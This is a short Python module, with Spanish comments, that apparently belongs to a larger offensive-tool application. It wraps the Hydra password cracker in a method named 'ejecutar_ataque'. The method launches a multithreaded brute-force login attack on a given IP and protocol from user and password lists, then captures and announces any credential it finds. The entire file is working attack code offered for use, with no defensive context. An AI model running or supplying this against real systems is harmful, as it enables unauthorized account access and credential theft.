from __future__ import annotations

import subprocess
from rich.panel import Panel

class HydraModule:
    def __init__(self, main_app):
        self.main_app = main_app

    def ejecutar_ataque(self, ip, protocolo, usuario_list, pass_list, hilos=16):
        self.main_app.animar_barra(f"Lanzando ataque Hydra sobre {ip}:{protocolo}...")
        
        # Construcción del comando
        # -L: lista de usuarios, -P: lista de passwords, -t: hilos, -f: parar al encontrar uno
        cmd = [
            "hydra", 
            "-L", usuario_list, 
            "-P", pass_list, 
            "-t", str(hilos), 
            "-f", "-V", 
            ip, protocolo
        ]

        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            for line in process.stdout:
                if "login:" in line.lower() and "password:" in line.lower():
                    self.main_app.console.print(f"[bold green][+] ¡CREDENCIAL ENCONTRADA!: {line.strip()}[/bold green]")
                    return line.strip()
                
            process.wait()
        except Exception as e:
            self.main_app.console.print(f"[bold red][!] Error en Hydra: {e}[/bold red]")